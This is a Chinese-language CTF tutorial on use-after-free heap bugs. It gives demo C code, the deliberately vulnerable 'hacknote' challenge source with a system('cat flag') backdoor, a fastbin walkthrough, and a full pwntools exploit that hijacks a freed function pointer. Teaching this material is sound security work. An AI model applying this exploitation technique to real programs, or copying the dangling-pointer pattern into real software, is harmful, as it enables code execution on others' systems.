**这个漏洞简称为UAF漏洞，顾名思义就是指当申请的chunk被释放后还可以被使用**

# 原理

UAF漏洞大部分都出现在使用一个指针P去申请一个指定大小的chunk，而当free指针P以后指针P并没有被置空(指向NULL)，那么即使释放了这块内存，但是依旧可以对这块内存进行操作

    
    
    #include <stdio.h>
    #include <stdlib.h>
    typedef struct name {
      char *myname;
      void (*func)(char *str);
    } NAME;
    void myprint(char *str) { printf("%s\n", str); }
    void printmyname() { printf("call print my name\n"); }
    int main() {
      NAME *a;
      a = (NAME *)malloc(sizeof(struct name));
      a->func = myprint;
      a->myname = "I can also use it";
      a->func("this is my function");
      // free without modify
      free(a);
      a->func("I can also use it");
      // free with modify
      a->func = printmyname;
      a->func("this is my function");
      // set NULL
      a = NULL;
      printf("this pogram will crash...\n");
      a->func("can not be printed...");
    }
    //这段代码使用的是2.21版本的glibc库，另外我还试了一下2.27版本的glibc库，发现修补了这个漏洞。大家如果感到好奇可以自己试一试并且再看一下源码有什么不一样
    

在ctfwiki找的一个代码，我们可以看一下这个代码：

首先定义了数据结构和两个函数

    
    
    typedef struct name {
      char *myname;
      void (*func)(char *str);
    } NAME;
    void myprint(char *str) { printf("%s\n", str); }
    void printmyname() { printf("call print my name\n"); }
    

定义了指针a以后，为指针a申请空间，并且将a->func指针指到myprint函数(函数指针就不过多赘述),在free掉a以后又进行了继续调用，然后将a置空再次调用a的函数。  
我们再来看一下回显![image.png](https://image.3001.net/images/20210920/1632140979_61487eb312bf405dbe4f9.png!small)  
我们可以看到虽然我们free掉a指针，但是a指向的函数依旧可以被调用。直到a被置为空以后发生了Segmention fault。

所以说UAF漏洞的危害很明显(这也是为什么学c语言的时候老师让我们free以后记得置空指针)

# 例题

同样是在ctfwiki中找的题，但是我想要更清楚的说明一下，最好能面向新手

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    struct note {
        
      void (*printnote)();
      char *content;
    };
    
    struct note *notelist[5];
    int count = 0;
    
    void print_note_content(struct note *this) {
         puts(this->content); }
    void add_note() {
        
      int i;
      char buf[8];
      int size;
      if (count > 5) {
        
        puts("Full");
        return;
      }
      for (i = 0; i < 5; i++) {
        
        if (!notelist[i]) {
        
          notelist[i] = (struct note *)malloc(sizeof(struct note));
          if (!notelist[i]) {
        
            puts("Alloca Error");
            exit(-1);
          }
          notelist[i]->printnote = print_note_content;
          printf("Note size :");
          read(0, buf, 8);
          size = atoi(buf);
          notelist[i]->content = (char *)malloc(size);
          if (!notelist[i]->content) {
        
            puts("Alloca Error");
            exit(-1);
          }
          printf("Content :");
          read(0, notelist[i]->content, size);
          puts("Success !");
          count++;
          break;
        }
      }
    }
    
    void del_note() {
        
      char buf[4];
      int idx;
      printf("Index :");
      read(0, buf, 4);
      idx = atoi(buf);
      if (idx < 0 || idx >= count) {
        
        puts("Out of bound!");
        _exit(0);
      }
      if (notelist[idx]) {
        
        free(notelist[idx]->content);
        free(notelist[idx]);
        puts("Success");
      }
    }
    
    void print_note() {
        
      char buf[4];
      int idx;
      printf("Index :");
      read(0, buf, 4);
      idx = atoi(buf);
      if (idx < 0 || idx >= count) {
        
        puts("Out of bound!");
        _exit(0);
      }
      if (notelist[idx]) {
        
        notelist[idx]->printnote(notelist[idx]);
      }
    }
    
    void magic() {
         system("cat flag"); }
    
    void menu() {
        
      puts("----------------------");
      puts("       HackNote       ");
      puts("----------------------");
      puts(" 1. Add note          ");
      puts(" 2. Delete note       ");
      puts(" 3. Print note        ");
      puts(" 4. Exit              ");
      puts("----------------------");
      printf("Your choice :");
    };
    
    int main() {
        
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stdin, 0, 2, 0);
      char buf[4];
      while (1) {
        
        menu();
        read(0, buf, 4);
        switch (atoi(buf)) {
        
        case 1:
          add_note();
          break;
        case 2:
          del_note();
          break;
        case 3:
          print_note();
          break;
        case 4:
          exit(0);
          break;
        default:
          puts("Invalid choice");
          break;
        }
      }
      return 0;
    }
    

这个是源码，然后我先对源码详细的讲解一下：

    
    
    struct note {
        
      void (*printnote)();
      char *content;
    };
    
    struct note *notelist[5];
    int count = 0;
    
    void print_note_content(struct note *this) {
         puts(this->content); }
    

这个是最开始的定义，定义了一个数据结构note，包含一个函数指针和一个字符串，并且定义了一个note类型的数组，而count是后面用来向数组中增加note的时候计数的。还定义了一个函数，用来输出note中的content。

    
    
    void add_note() {
        
      int i;
      char buf[8];
      int size;
      if (count > 5) {
        
        puts("Full");
        return;
      }
      for (i = 0; i < 5; i++) {
        
        if (!notelist[i]) {
        
          notelist[i] = (struct note *)malloc(sizeof(struct note));
          if (!notelist[i]) {
        
            puts("Alloca Error");
            exit(-1);
          }
          notelist[i]->printnote = print_note_content;
          printf("Note size :");
          read(0, buf, 8);
          size = atoi(buf);
          notelist[i]->content = (char *)malloc(size);
          if (!notelist[i]->content) {
        
            puts("Alloca Error");
            exit(-1);
          }
          printf("Content :");
          read(0, notelist[i]->content, size);
          puts("Success !");
          count++;
          break;
        }
      }
    }
    

这个是add_note函数，首先会申请内存，内存大小为note的大小(32位就是8字节)，然后内存的地址就存放在notelist数组中，并且将函数指针指向print_note_content，然后会申请内存空间用来存放content，大小用户自定义但是无限制。

    
    
    void del_note() {
        
      char buf[4];
      int idx;
      printf("Index :");
      read(0, buf, 4);
      idx = atoi(buf);
      if (idx < 0 || idx >= count) {
        
        puts("Out of bound!");
        _exit(0);
      }
      if (notelist[idx]) {
        
        free(notelist[idx]->content);
        free(notelist[idx]);
        puts("Success");
      }
    }
    

这个函数用来删除指定下标的note和content，而且很明显free后没有置空指针，所以存在UAF漏洞

    
    
    void print_note() {
        
      char buf[4];
      int idx;
      printf("Index :");
      read(0, buf, 4);
      idx = atoi(buf);
      if (idx < 0 || idx >= count) {
        
        puts("Out of bound!");
        _exit(0);
      }
      if (notelist[idx]) {
        
        notelist[idx]->printnote(notelist[idx]);
      }
    }
    

输出指定的下标函数，这个很简单

    
    
    void magic() {
         system("cat flag"); }
    

一个后门函数，我们后面会用到

    
    
    int main() {
        
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stdin, 0, 2, 0);
      char buf[4];
      while (1) {
        
        menu();
        read(0, buf, 4);
        switch (atoi(buf)) {
        
        case 1:
          add_note();
          break;
        case 2:
          del_note();
          break;
        case 3:
          print_note();
          break;
        case 4:
          exit(0);
          break;
        default:
          puts("Invalid choice");
          break;
        }
      }
    

主函数，就是用来进行选择的，可以根据菜单函数进行选择

    
    
    void menu() {
        
      puts("----------------------");
      puts("       HackNote       ");
      puts("----------------------");
      puts(" 1. Add note          ");
      puts(" 2. Delete note       ");
      puts(" 3. Print note        ");
      puts(" 4. Exit              ");
      puts("----------------------");
      printf("Your choice :");
    };
    

我们已经将代码分析完了，漏洞我们也看见了，也就是UAF漏洞。那么我们如何利用？  
首先，我们已经得到了一个后门函数，并且我们自己申请的堆内存中存在一个函数指针，这个函数指针可以被调用(选择3print
note就可以调用)。那么我们完全可以覆盖掉我们自己的函数指针，然后进行后门函数的调用

## 解析

  1. 首先我们申请两个note，我们将其命名为note1和note2，并且我们已知给这两个note分配的内存为8Byte，并且我们的content大小可以定义为16(其实只要和note大小不一样就行)

  2. 然后我们释放掉两个note，由于申请的是两个8byte的chunk，所以两个chunk就被放在fastbin中

  3. 然后我们再次申请一个note3，并且content大小定义为8

  4. 重点来了，由于note3大小为8，所以分配的chunk其实就是note2的chunk(因为我们先释放的是note1再释放的note2，那么note2就是链表的尾部，前面已经讲过fast bin是先入后出的，直接对链表尾进行操作)，而我们content大小定为8其实就是使用的note1的空间(因为大小和note1相同)。而当我们输入内容的时候输入的就是后门函数的地址

  5. 我们并没有把note1置空，所以我们的note1依旧可以使用该地址。然后note1的print note就相当于是直接调用了后门函数的地址，然后拿到shell

于是我们可以得到EXP

    
    
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    
    r = process('./hacknote')
    
    
    def addnote(size, content):
        r.recvuntil(":")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(content)
    
    
    def delnote(idx):
        r.recvuntil(":")
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(idx))
    
    
    def printnote(idx):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(idx))
    
    
    #gdb.attach(r)
    magic = 0x08048986
    
    addnote(32, "aaaa") # add note 0
    addnote(32, "ddaa") # add note 1
    
    delnote(0) # delete note 0
    delnote(1) # delete note 1
    
    addnote(8, p32(magic)) # add note 2
    
    printnote(0) # print note 0
    
    r.interactive()
    

**这个就是UAF比较简单的利用，更复杂的利用好多CTF中也有，，一般都是搭配ROP进行攻击的，我太菜了所以就简单的写一下**

 **本文参考自[ctfwiki](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/)、[_fanghuapyk的博客](https://www.cxyzjd.com/article/fanghuapyk/103337444)。感谢大佬**

